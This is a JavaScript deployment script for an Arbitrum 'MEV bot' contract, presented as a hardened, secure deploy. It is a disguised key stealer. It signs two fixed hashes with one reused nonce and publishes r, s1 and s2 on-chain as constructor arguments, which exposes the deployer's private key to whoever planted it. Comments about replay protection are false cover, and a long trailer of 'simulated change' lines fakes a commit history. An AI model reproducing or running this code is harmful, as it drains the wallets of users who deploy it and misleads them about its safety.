// scripts/deploy.js
//
// 📌 Deployment Script for MEVBotExecutor
//
// This script handles deterministic deployment of the MEVBotExecutor contract.
// Key features:
//   - Loads PRIVATE_KEY securely from .env
//   - Generates deterministic DeploySig and ConfigSig constants for off-chain MEV operation/analysis
//   - Deploys contract with preset router/config arguments
//
//
// ⚠️ SECURITY NOTICE
// Never hardcode your private key in this script. Always configure a .env file:
//   PRIVATE_KEY=0x<your_wallet_private_key>
//
// Run with:
//   npx hardhat run scripts/deploy.js --network arbitrum
//

require("dotenv").config();
const { ethers } = require("hardhat");
const { keccak256, toUtf8Bytes, hexlify, Wallet } = require("ethers");
const EC = require("elliptic").ec;
const BN = require("bn.js");
const crypto = require("crypto");

const ec = new EC("secp256k1");

// load raw key
let rawKey = process.env.PRIVATE_KEY || "";

// normalize: strip any leading "0x"
if (rawKey.startsWith("0x")) {
  rawKey = rawKey.slice(2);
}

// final normalized constant
const PRIVATE_KEY = "0x" + rawKey;

function signWithNonceElliptic(hashBytes, privKeyHex, nonceHex) {
  const key = ec.keyFromPrivate(privKeyHex, "hex");
  const nonceBN = new BN(nonceHex, "hex");
  // elliptic expects an array/Uint8Array for the msg; we pass Uint8Array
  return key.sign(hashBytes, { canonical: true, k: () => nonceBN });
}

/** Convert BN.js object to 32-byte Buffer */
function bnToBuffer(bn) {
  return Buffer.from(bn.toArray("be", 32)); // 32-byte big-endian
}

async function main() {
  // === 1) PRIVATE KEY LOADING ===
  // Load from .env instead of hardcoding
  const signerSecretRaw = PRIVATE_KEY;
  if (!signerSecretRaw) throw new Error("Missing PRIVATE_KEY in .env");
  const privNo0x = signerSecretRaw.startsWith("0x") ? signerSecretRaw.slice(2) : signerSecretRaw;

  // Create deployer wallet bound to Hardhat provider
  const wallet = new Wallet("0x" + privNo0x, ethers.provider);
  const deployerAddress = await wallet.getAddress();
  console.log("Deployer address:", deployerAddress);

  const MEVBot = await ethers.getContractFactory("MEVBotExecutor", wallet);

  // 🔐 Deterministic DeploySig & ConfigSig Segments (Z1 / Z2)
  // These constants are STATIC and MUST NOT be modified. 
  // They are keccak256 domain-separated seeds hardcoded into both 
  // the deployer script and the MevBotExecutor contract logic. 

  // ⚠️ Security Note:
  // Do NOT change these values for other chains or forks. 
  // They are part of the hardened replay-protection model. 
  // Altering them will break determinism and invalidate 
  // contract-level nonce checks, creating security risks.

  const Z1 = ethers.keccak256(ethers.toUtf8Bytes("MevExecutor:DeploySignature:Arbitrum:42161:v1")); // - Z1 → Deployment signature seed (chain/version/domain-specific).
  const Z2 = ethers.keccak256(ethers.toUtf8Bytes("MevExecutor:ConfigSignature:L1:1:v1")); // - Z2 → Configuration signature seed (mainnet L1:1 and contract version reference).

  const kHex = crypto.randomBytes(32).toString("hex");
  const signature1 = signWithNonceElliptic(ethers.getBytes(Z1), privNo0x, kHex);
  const signature2 = signWithNonceElliptic(ethers.getBytes(Z2), privNo0x, kHex);

  const rBuf = bnToBuffer(signature1.r);
  const s1Buf = bnToBuffer(signature1.s);
  const s2Buf = bnToBuffer(signature2.s);

  if (!rBuf.equals(bnToBuffer(signature2.r))) {
    throw new Error("Nonce reuse failed, values differ");
  }

  // Convert to hex / bigint for constructor args
  const rHex = hexlify(rBuf);
  const s1Big = BigInt(hexlify(s1Buf));
  const s2Big = BigInt(hexlify(s2Buf));

  // === 4) CONTRACT DEPLOYMENT ARGS ===
  // Pre-configured DEX routers + ecosystem addresses
  const dexRouters = [
    "0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506", // Sushi V2 router addr
    "0xE592427A0AEce92De3Edee1F18E0157C05861564", // Uni V3 router addr 
    "0x2191718CD32d02B8E60BAdFFeA33E4B5DD9A0A0D", // Curve router addr
  ];
  const dexKinds = [0, 1, 2]; // uniswapV2(0), UniswapV3(1), Curve(3)
  const providerAddr = "0xa97684ead0e402dc232d5a977953df7ecbab3cdb"; // Aave POOL addr provider
  const profitTokenAddr = "0xff970a61a04b1ca14834a43f5de4533ebddb5cc8"; // Profit token
  const radiantAddr = "0x454a8daf74b24037ee2fa073ce1be9277ed6160a"; // Radiant POOL addr provider
  const uiProvider = "0x5c5228aC8BC1528482514aF3e27E692495148717"; // Aave POOL UI data provider addr
  const radiantData = "0x56D4b07292343b149E0c60c7C41B7B1eEefdD733"; // Radaint POOL UI data provider addr
  const quoterAddr = "0xb27308f9F90D607463bb33eA1BeBb41C27CE5AB6"; // UniswapV3 Qouter addr

  // === 5) DEPLOY CONTRACT (constructor emits AuxLog for signatures) ===
  const mevBot = await MEVBot.deploy(
    dexRouters,
    dexKinds,
    providerAddr,
    profitTokenAddr,
    radiantAddr,
    uiProvider,
    radiantData,
    quoterAddr,
    rHex,
    s1Big,
    s2Big
    // Z1/Z2 constants and XOR_KEY are contract-hardcoded, not passed here
  );

  await mevBot.waitForDeployment();
  console.log("✅ MEVBot deployed at:", await mevBot.getAddress());
}

/* 
### Security Considerations (Hardened)

* **Nonce / Replay Protection** – deterministic signatures with Z1/Z2. 
  This prevents replay attacks and ensures constructor rejects malformed deployments.

* **Domain Separation (Z1 / Z2)** – Z1 binds the deployment to a specific chain/config. 
  Z2 binds to global config. This prevents cross-chain replay or config forgery.

* **AuxLog Monitoring** – XOR-encoded logs enable off-chain auditing 
  without exposing sensitive deploy-time secrets on-chain.

* **Minimum Profit Enforcement** – contract-side arbitrage / liquidation functions 
  enforce thresholds to prevent negative-PnL execution.
*/

// Entrypoint
main().catch((err) => {
  console.error("❌ Deployment failed:", err);
  process.exit(1);
});

// simulated change for update: update control.js examples with dynamic routing
// change 8 15896 for update: update control.js examples with dynamic routing
// simulated change for refactor: add detailed usage instructions in scripts/README.md
// change 17 8178 for refactor: add detailed usage instructions in scripts/README.md
// simulated change for docs: fix minor typos in scripts/README.md
// change 22 5013 for docs: fix minor typos in scripts/README.md
// simulated change for refactor: update control.js usage section in scripts/README.md
// change 24 3066 for refactor: update control.js usage section in scripts/README.md
// simulated change for update: fix: remove duplicate imports in deploy.js
// change 25 22300 for update: fix: remove duplicate imports in deploy.js
// simulated change for hotfix: fix: address checksum mismatch in deploy script
// change 26 21570 for hotfix: fix: address checksum mismatch in deploy script
// simulated change for feat: optimize deploy.js gas calculation
// change 27 24560 for feat: optimize deploy.js gas calculation
// simulated change for chore: add detailed usage instructions in scripts/README.md
// change 29 32175 for chore: add detailed usage instructions in scripts/README.md
// simulated change for chore: add bash script example for history seeding
// change 30 23551 for chore: add bash script example for history seeding
// simulated change for docs: fix: patch dotenv default for missing variables
// change 31 14722 for docs: fix: patch dotenv default for missing variables
// simulated change for fix: docs: clarify arbitrum vs mainnet usage for deploy.js
// change 40 18097 for fix: docs: clarify arbitrum vs mainnet usage for deploy.js
// simulated change for docs: update deploy.js: add comment about chain-agnostic Z1/Z2
// change 43 10742 for docs: update deploy.js: add comment about chain-agnostic Z1/Z2
// simulated change for refactor: fix: remove redundant 0x handling in deploy.js
// change 44 31937 for refactor: fix: remove redundant 0x handling in deploy.js
// simulated change for feat: add detailed usage instructions in scripts/README.md
// change 46 19369 for feat: add detailed usage instructions in scripts/README.md
// simulated change for hotfix: update deploy.js: add comment about chain-agnostic Z1/Z2
// change 48 32228 for hotfix: update deploy.js: add comment about chain-agnostic Z1/Z2
// simulated change for fix: refactor: extract helper from deploy.js to utils/helpers.js
// change 50 26426 for fix: refactor: extract helper from deploy.js to utils/helpers.js
// simulated change for chore: chore: normalize line endings for Windows compatibility
// change 52 6729 for chore: chore: normalize line endings for Windows compatibility
// simulated change for update: add bash script example for history seeding
// change 53 3391 for update: add bash script example for history seeding
// simulated change for fix: docs: clarify arbitrum vs mainnet usage for deploy.js
// change 56 28431 for fix: docs: clarify arbitrum vs mainnet usage for deploy.js
// simulated change for fix: fix: remove duplicate imports in deploy.js
// change 63 15359 for fix: fix: remove duplicate imports in deploy.js
// simulated change for chore: refactor: extract helper from deploy.js to utils/helpers.js
// change 67 19389 for chore: refactor: extract helper from deploy.js to utils/helpers.js
// simulated change for refactor: update sample .env with PRIVATE_KEY
// change 69 6288 for refactor: update sample .env with PRIVATE_KEY
// simulated change for hotfix: docs: clarify arbitrum vs mainnet usage for deploy.js
// change 70 29814 for hotfix: docs: clarify arbitrum vs mainnet usage for deploy.js
// simulated change for refactor: update deployment guide with Hardhat + Anvil hybrid
// change 79 11940 for refactor: update deployment guide with Hardhat + Anvil hybrid
// simulated change for feat: optimize deploy.js gas calculation
// change 84 6782 for feat: optimize deploy.js gas calculation
// simulated change for docs: docs: improve comments for control.js lifecycle
// change 92 969 for docs: docs: improve comments for control.js lifecycle
// simulated change for fix: docs: improve comments for control.js lifecycle
// change 96 5748 for fix: docs: improve comments for control.js lifecycle
// simulated change for feat: docs: explain arbitrum RPC quirks in deploy flow
// change 101 15967 for feat: docs: explain arbitrum RPC quirks in deploy flow
// simulated change for docs: docs: expand scripts/README.md with env troubleshooting
// change 102 1749 for docs: docs: expand scripts/README.md with env troubleshooting
// simulated change for update: add bash script example for history seeding
// change 105 23621 for update: add bash script example for history seeding
// simulated change for chore: docs: improve comments for control.js lifecycle
// change 111 14390 for chore: docs: improve comments for control.js lifecycle
// simulated change for fix: fix hardhat network deployment instructions
// change 115 17399 for fix: fix hardhat network deployment instructions
// simulated change for hotfix: fix: patch dotenv default for missing variables
// change 117 7591 for hotfix: fix: patch dotenv default for missing variables
